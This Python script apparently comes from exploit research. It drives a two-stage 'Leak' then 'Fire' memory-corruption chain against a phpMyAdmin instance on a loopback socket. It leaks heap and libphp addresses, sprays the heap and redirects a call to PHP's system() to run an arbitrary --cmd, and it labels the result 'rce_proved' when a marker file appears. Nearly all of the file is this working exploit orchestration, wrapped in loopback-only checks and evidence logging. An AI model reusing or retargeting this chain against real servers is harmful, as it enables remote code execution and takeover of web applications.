#!/usr/bin/env python3
"""Run Leak and Fire consecutively on one loopback HTTP/1.1 socket.

The experiment deliberately omits ``Fire.rotate()``.  Each attempt opens one
fresh persistent connection, runs the hash-pinned Leak producer/consumer,
decodes that worker's addresses, then hands the exact socket and buffered
reader to the hash-pinned Fire producer/consumer.  Success requires a fresh
404-to-exact-body transition and identical socket evidence across all four
requests.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
from pathlib import Path
import re
import sys
import time
from datetime import datetime, timezone
from urllib.parse import urlsplit


HERE = Path(__file__).resolve().parent
LEAK_DRIVER = HERE / "pma_keepalive_leak.py"
FIRE_DRIVER = HERE / "pma_keepalive_fire.py"
EXPECTED_LEAK_DRIVER_SHA256 = (
    "30d581a068a2addbc04dc1776847b63cb4c2034c2459a364386d67eb6f36bdca"
)
EXPECTED_FIRE_DRIVER_SHA256 = (
    "28797042245d4738376e4b44f445287ddf60f759a0a0bb8d03c937b829407932"
)


def file_sha256(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as stream:
        for block in iter(lambda: stream.read(1 << 20), b""):
            digest.update(block)
    return digest.hexdigest()


if file_sha256(LEAK_DRIVER) != EXPECTED_LEAK_DRIVER_SHA256:
    raise RuntimeError("refusing an unpinned keep-alive leak diagnostic")
if file_sha256(FIRE_DRIVER) != EXPECTED_FIRE_DRIVER_SHA256:
    raise RuntimeError("refusing an unpinned keep-alive Fire diagnostic")
sys.path.insert(0, str(HERE))

import pma_keepalive_leak as keep  # type: ignore
import pma_keepalive_fire as fire_support  # type: ignore


stock = keep.stock
TARGET_URL = "http://127.0.0.1:18212/show_config_errors.php"
HOST_HEADER = "x"


def utc_now() -> str:
    return datetime.now(timezone.utc).isoformat()


def atomic_json(path: Path, document: object) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    temporary = path.with_name(path.name + ".new")
    temporary.write_text(json.dumps(document, indent=2) + "\n", encoding="utf-8")
    os.replace(temporary, path)


def adopt_fire_transport(
    leak_endpoint: keep.PersistentEndpoint,
    evidence: Path,
    attempt: dict[str, object],
    save,
) -> fire_support.FirePersistentEndpoint:
    """Move the exact open socket/reader into the Fire transport adapter."""
    fire_endpoint = object.__new__(fire_support.FirePersistentEndpoint)
    fire_endpoint.host = leak_endpoint.host
    fire_endpoint.port = leak_endpoint.port
    fire_endpoint.path = leak_endpoint.path
    fire_endpoint.host_header = leak_endpoint.host_header
    fire_endpoint.host_override = leak_endpoint.host_override
    fire_endpoint.timeout = leak_endpoint.timeout
    fire_endpoint.evidence = evidence
    fire_endpoint.receipt = attempt
    fire_endpoint.save = save
    fire_endpoint.sock = leak_endpoint.sock
    fire_endpoint.reader = leak_endpoint.reader
    fire_endpoint.initial_identity = leak_endpoint.initial_identity
    fire_endpoint.call_index = 0
    fire_endpoint.reusable = leak_endpoint.reusable
    fire_endpoint.closed_reason = leak_endpoint.closed_reason
    return fire_endpoint


def same_socket(exchanges: list[dict[str, object]]) -> bool:
    if len(exchanges) != 4:
        return False
    identities = [exchange.get("socket_before") for exchange in exchanges]
    if not all(isinstance(identity, dict) for identity in identities):
        return False
    keys = ("python_object_id", "fileno", "local", "peer")
    first = identities[0]
    assert isinstance(first, dict)
    return all(
        all(identity.get(key) == first.get(key) for key in keys)
        for identity in identities[1:]
        if isinstance(identity, dict)
    )


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Run fresh Leak then Fire over one loopback HTTP/1.1 socket."
    )
    parser.add_argument("--url", default=TARGET_URL)
    parser.add_argument("--host-header", default=HOST_HEADER)
    parser.add_argument("--cmd", required=True)
    parser.add_argument("--fetch", required=True)
    parser.add_argument("--expect", required=True)
    parser.add_argument("--attempts", type=int, default=1)
    parser.add_argument(
        "--table-off", type=lambda value: int(value, 0), default=fire_support.TABLE_OFFSET
    )
    parser.add_argument("--decoy-n", type=int, default=2)
    parser.add_argument("--carrier", choices=("adopted", "live"), default="adopted")
    parser.add_argument("--live-n", type=int, default=0)
    parser.add_argument("--live-len", type=int, default=31)
    parser.add_argument("--fill-n", type=int, default=0)
    parser.add_argument("--producer-pads", default="")
    parser.add_argument(
        "--stock-live-profile",
        action="store_true",
        help="use the engine's calibrated live-carrier profile",
    )
    parser.add_argument("--rotate-before", action="store_true")
    parser.add_argument(
        "--progress-late",
        action="store_true",
        help="place Fire consumer session-progress arm fields after the spray",
    )
    parser.add_argument(
        "--debug-pause",
        action="store_true",
        help="pause up to 30 seconds after opening the persistent socket",
    )
    parser.add_argument(
        "--debug-pause-after-leak",
        action="store_true",
        help="pause after Leak on the accepted worker",
    )
    parser.add_argument("--debug-pause-timeout", type=float, default=30.0)
    parser.add_argument("--timeout", type=float, default=180.0)
    parser.add_argument("--out", type=Path)
    parser.add_argument("--ack-exact-profile", action="store_true")
    args = parser.parse_args()
    parsed = urlsplit(args.url)
    if (
        parsed.scheme != "http"
        or parsed.hostname != "127.0.0.1"
        or parsed.port not in (18212, 18213)
        or parsed.path != "/show_config_errors.php"
        or parsed.query
    ):
        parser.error("--url must be the explicit loopback 18212/18213 diagnostic route")
    if args.host_header != "x":
        parser.error("--host-header must be x")
    if not args.ack_exact_profile:
        parser.error("--ack-exact-profile is required")
    if not 1 <= args.attempts <= 6:
        parser.error("--attempts must be within 1..6")
    if not 10.0 <= args.timeout <= 300.0:
        parser.error("--timeout must be within 10..300 seconds")
    if not 1.0 <= args.debug_pause_timeout <= 120.0:
        parser.error("--debug-pause-timeout must be within 1..120 seconds")
    if not 0x1000 <= args.table_off < 0x200000:
        parser.error("--table-off must stay within the leaked 2 MiB ZendMM chunk")
    if not 0 <= args.decoy_n <= 63:
        parser.error("--decoy-n must be within 0..63")
    if args.stock_live_profile:
        args.carrier = "live"
        args.live_n = stock.PROFILE_LIVE
        args.live_len = 31
        args.fill_n = stock.PROFILE_FILL
        args.progress_late = True
        args.table_off = stock.PROFILE_TABLE_OFF
        args.producer_pads = stock.PROFILE_PADS
        args.decoy_n = 2
    if not 0 <= args.live_n <= 2000:
        parser.error("--live-n must be within 0..2000")
    if not 24 <= args.live_len <= 128:
        parser.error("--live-len must be within 24..128")
    if not 0 <= args.fill_n <= 128:
        parser.error("--fill-n must be within 0..128")
    try:
        stock.parse_pads(args.producer_pads)
    except (TypeError, ValueError) as exc:
        parser.error(f"invalid --producer-pads: {exc}")
    command = args.cmd.encode()
    expected = args.expect.encode()
    if not command or len(command) > 14 or b"\0" in command:
        parser.error("--cmd must be 1..14 bytes without NUL")
    if not re.fullmatch(r"/[a-z0-9]{1,8}", args.fetch):
        parser.error("--fetch must be a short root-relative lowercase marker path")
    if not expected or len(expected) > 32 or b"\0" in expected:
        parser.error("--expect must be 1..32 bytes without NUL")
    return args


def main() -> int:
    args = parse_args()
    stamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    evidence = (
        args.out.resolve()
        if args.out is not None
        else (HERE / "evidence" / f"pma-keepalive-chain-{stamp}-{os.getpid()}").resolve()
    )
    evidence.mkdir(parents=True, exist_ok=False)
    receipt_path = evidence / "receipt.json"
    receipt: dict[str, object] = {
        "schema": "q618-pma-keepalive-leak-fire-v1",
        "status": "started",
        "started_utc": utc_now(),
        "target": args.url,
        "host_header": args.host_header,
        "exact_profile_acknowledged": True,
        "blockers_started_by_diagnostic": 0,
        "command": args.cmd,
        "fetch": args.fetch,
        "expected_body_text": args.expect,
        "expected_body_hex": args.expect.encode().hex(),
        "diagnostic_sha256": file_sha256(Path(__file__).resolve()),
        "leak_driver": str(LEAK_DRIVER),
        "leak_driver_sha256": EXPECTED_LEAK_DRIVER_SHA256,
        "fire_driver": str(FIRE_DRIVER),
        "fire_driver_sha256": EXPECTED_FIRE_DRIVER_SHA256,
        "engine": str(keep.ENGINE),
        "engine_sha256": keep.EXPECTED_ENGINE_SHA256,
        "offsets": {
            "zif_system": hex(fire_support.ZIF_SYSTEM),
            "zval_ptr_dtor": hex(fire_support.ZVAL_PTR_DTOR),
            "table": hex(args.table_off),
        },
        "rotate_before_each_attempt": args.rotate_before,
        "fire_progress_late": args.progress_late,
        "fire_decoy_n": args.decoy_n,
        "fire_carrier": args.carrier,
        "fire_live_n": args.live_n,
        "fire_live_len": args.live_len,
        "fire_fill_n": args.fill_n,
        "producer_pads": args.producer_pads,
        "stock_live_profile": args.stock_live_profile,
        "fire_rotate_omitted": True,
        "transport": "one HTTP/1.1 socket for Leak producer/consumer then Fire producer/consumer",
        "attempts": [],
    }

    def save() -> None:
        atomic_json(receipt_path, receipt)

    save()
    ordinary = stock.Endpoint(args.url, args.timeout)
    ordinary.host_override = args.host_header
    ordinary.host_header = args.host_header
    expected = args.expect.encode()
    try:
        health_before, health_body = fire_support.one_get(
            args.url, args.host_header, "/", args.timeout, evidence, "health-before"
        )
        receipt["health_before"] = health_before
        if health_before.get("status") != 200 or b"phpMyAdmin" not in health_body:
            raise keep.DiagnosticStopped("target was not a functional phpMyAdmin")
        preproof, preproof_body = fire_support.one_get(
            args.url, args.host_header, args.fetch, args.timeout, evidence, "proof-before"
        )
        receipt["proof_before"] = preproof
        receipt["proof_before_body_hex"] = preproof_body.hex()
        if preproof.get("status") != 404:
            raise keep.DiagnosticStopped("fresh marker path did not return HTTP 404")
        save()

        for attempt_number in range(1, args.attempts + 1):
            attempt_dir = evidence / f"attempt-{attempt_number}"
            attempt_dir.mkdir()
            attempt: dict[str, object] = {
                "attempt": attempt_number,
                "status": "started",
                "started_utc": utc_now(),
                "exchanges": [],
            }
            attempts = receipt["attempts"]
            assert isinstance(attempts, list)
            attempts.append(attempt)
            save()
            if args.rotate_before:
                attempt["rotate_started_utc"] = utc_now()
                stock.Leak(ordinary, fire_support.ZVAL_PTR_DTOR, True).rotate()
                attempt["rotate_completed_utc"] = utc_now()
                save()

            persistent = keep.PersistentEndpoint(
                args.url, args.timeout, args.host_header, attempt_dir, attempt, save
            )
            attempt["persistent_socket_initial"] = persistent.initial_identity
            attempt["persistent_socket_reusable"] = True
            save()
            if args.debug_pause:
                ready_path = attempt_dir / "debug-ready.json"
                continue_path = attempt_dir / "debug-continue"
                atomic_json(ready_path, {
                    "status": "ready",
                    "utc": utc_now(),
                    "socket": persistent.initial_identity,
                    "continue_file": str(continue_path),
                })
                attempt["debug_pause"] = {
                    "ready_file": str(ready_path),
                    "continue_file": str(continue_path),
                    "started_utc": utc_now(),
                }
                save()
                print(f"DEBUG_READY {ready_path}", flush=True)
                deadline = time.monotonic() + args.debug_pause_timeout
                while not continue_path.exists() and time.monotonic() < deadline:
                    time.sleep(0.05)
                if not continue_path.exists():
                    raise keep.DiagnosticStopped("debug pause timed out before continue")
                attempt["debug_pause"]["continued_utc"] = utc_now()
                save()
            leak_error: str | None = None
            fire_error: str | None = None
            heap = module = pointer_count = 0
            cookie = b""
            try:
                heap, module, pointer_count, cookie = stock.Leak(
                    persistent, fire_support.ZVAL_PTR_DTOR, True
                ).attempt()
            except Exception as exc:
                leak_error = f"{type(exc).__name__}: {exc}"
            attempt.update({
                "leak_error": leak_error,
                "heap": hex(heap),
                "libphp": hex(module),
                "pointer_count": pointer_count,
                "cookie_bytes": len(cookie),
                "cookie_sha256": hashlib.sha256(cookie).hexdigest(),
            })
            (attempt_dir / "leak.cookie.bin").write_bytes(cookie)
            leak_ready = (
                leak_error is None
                and heap != 0
                and module != 0
                and len(cookie) >= 1000
                and persistent.reusable
            )
            attempt["leak_ready_on_persistent_socket"] = leak_ready
            save()

            if args.debug_pause_after_leak and leak_ready:
                ready_path = attempt_dir / "debug-after-leak-ready.json"
                continue_path = attempt_dir / "debug-after-leak-continue"
                atomic_json(ready_path, {
                    "status": "ready",
                    "utc": utc_now(),
                    "socket": keep.socket_identity(persistent.sock),
                    "heap": hex(heap),
                    "libphp": hex(module),
                    "continue_file": str(continue_path),
                })
                attempt["debug_pause_after_leak"] = {
                    "ready_file": str(ready_path),
                    "continue_file": str(continue_path),
                    "started_utc": utc_now(),
                }
                save()
                print(f"DEBUG_AFTER_LEAK_READY {ready_path}", flush=True)
                deadline = time.monotonic() + args.debug_pause_timeout
                while not continue_path.exists() and time.monotonic() < deadline:
                    time.sleep(0.02)
                if not continue_path.exists():
                    raise keep.DiagnosticStopped(
                        "after-Leak debug pause timed out before continue"
                    )
                attempt["debug_pause_after_leak"]["continued_utc"] = utc_now()
                save()

            fire_endpoint: fire_support.FirePersistentEndpoint | None = None
            if leak_ready:
                handoff_before = keep.socket_identity(persistent.sock)
                fire_endpoint = adopt_fire_transport(
                    persistent, attempt_dir, attempt, save
                )
                handoff_after = keep.socket_identity(fire_endpoint.sock)
                attempt["leak_to_fire_socket_handoff"] = {
                    "before": handoff_before,
                    "after": handoff_after,
                    "identical": handoff_before == handoff_after,
                }
                save()
                try:
                    fire_stage = stock.Fire(
                        fire_endpoint,
                        fire_support.ZIF_SYSTEM,
                        fire_support.ZVAL_PTR_DTOR,
                        True,
                    )
                    table_address = heap + args.table_off
                    system_address = module + fire_support.ZIF_SYSTEM
                    attempt["fire_table_address"] = hex(table_address)
                    attempt["fire_system_address"] = hex(system_address)
                    fire_stage.producer(
                        "a" * 32,
                        stock.parse_pads(args.producer_pads),
                    )
                    attempt["fire_producer_completed_utc"] = utc_now()
                    atomic_json(attempt_dir / "fire-consumer-stage.json", {
                        "status": "about-to-send",
                        "utc": utc_now(),
                        "socket": keep.socket_identity(fire_endpoint.sock),
                        "table_address": hex(table_address),
                        "system_address": hex(system_address),
                        "decoy_n": args.decoy_n,
                        "progress_late": args.progress_late,
                    })
                    save()
                    fire_stage.consumer(
                        table_address,
                        system_address,
                        args.cmd.encode(),
                        spray=15,
                        live_n=args.live_n,
                        live_len=args.live_len,
                        fill_n=args.fill_n,
                        carrier_mode=args.carrier,
                        progress_late=args.progress_late,
                        decoy_n=args.decoy_n,
                    )
                except Exception as exc:
                    fire_error = f"{type(exc).__name__}: {exc}"
            try:
                persistent.close()
            except Exception:
                pass

            exchanges = attempt["exchanges"]
            assert isinstance(exchanges, list)
            typed_exchanges = [item for item in exchanges if isinstance(item, dict)]
            all_four_same = same_socket(typed_exchanges)
            fire_consumer_sent = (
                len(typed_exchanges) == 4
                and bool(typed_exchanges[3].get("request_fully_sent"))
            )
            attempt.update({
                "fire_error": fire_error,
                "same_socket_for_all_four_requests": all_four_same,
                "fire_consumer_request_fully_sent": fire_consumer_sent,
                "ended_utc": utc_now(),
            })
            time.sleep(0.8)
            proof, proof_body = fire_support.one_get(
                args.url,
                args.host_header,
                args.fetch,
                args.timeout,
                attempt_dir,
                "proof-after",
            )
            attempt["proof_after"] = proof
            attempt["proof_after_body_hex"] = proof_body.hex()
            exact_proof = proof.get("status") == 200 and proof_body == expected
            attempt["proof_exact"] = exact_proof
            if exact_proof and leak_ready and all_four_same and fire_consumer_sent:
                attempt["status"] = "rce_proved"
                receipt["status"] = "rce_proved"
                receipt["successful_attempt"] = attempt_number
                receipt["proof_fresh"] = True
                receipt["same_socket_all_four_proved"] = True
                save()
                break
            attempt["status"] = (
                "leak_failed" if not leak_ready else "fire_failed_no_exact_proof"
            )
            save()

        health_after, health_after_body = fire_support.one_get(
            args.url, args.host_header, "/", args.timeout, evidence, "health-after"
        )
        receipt["health_after"] = health_after
        receipt["target_healthy_after"] = (
            health_after.get("status") == 200 and b"phpMyAdmin" in health_after_body
        )
        if not receipt["target_healthy_after"]:
            raise keep.DiagnosticStopped("target was not healthy after chain")
        if receipt.get("status") != "rce_proved":
            receipt["status"] = "chain_failed_no_exact_proof"
            receipt["proof_fresh"] = False
            raise keep.DiagnosticStopped("combined same-socket chain produced no proof")
        receipt["ended_utc"] = utc_now()
        save()
        print(json.dumps(receipt, indent=2))
        print(f"evidence: {evidence}")
        return 0
    except Exception as exc:
        previous = str(receipt.get("status", "started"))
        if previous == "rce_proved":
            receipt["status"] = "proof_observed_but_postcondition_failed"
        elif previous == "started":
            receipt["status"] = "stopped"
        receipt["error"] = f"{type(exc).__name__}: {exc}"
        receipt["ended_utc"] = utc_now()
        save()
        print(json.dumps(receipt, indent=2))
        print(f"evidence: {evidence}")
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
